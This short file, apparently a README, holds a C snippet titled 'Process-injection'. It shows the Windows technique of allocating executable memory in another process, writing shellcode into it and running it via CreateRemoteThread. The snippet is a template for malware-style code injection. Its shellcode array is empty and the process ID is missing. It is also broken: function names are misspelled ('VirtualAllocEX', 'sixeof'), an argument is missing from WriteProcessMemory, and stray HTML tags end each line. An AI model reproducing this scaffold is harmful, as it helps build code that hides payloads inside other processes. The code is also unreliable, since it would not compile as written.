# Process-injection

#include <stdio.h> </br>
#include <windows.h> </br>

int main() </br>
{ </br>
    char shellcode[] = {}; </br>
    HANDLE hProcess; </br>
    HANDLE hThread; </br>
    void* exec_mem; </br>
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, ); </br>
    exec_mem = VirtualAllocEX(hProcess, NULL, sixeof(shellcode) , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); </br>
    WriteProcessMemory(hProcess, exec_mem, sizeof(shellcode)); </br>
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0); </br>
    CloseHandle(hProcess); </br>
    return 0; </br>

} </br>
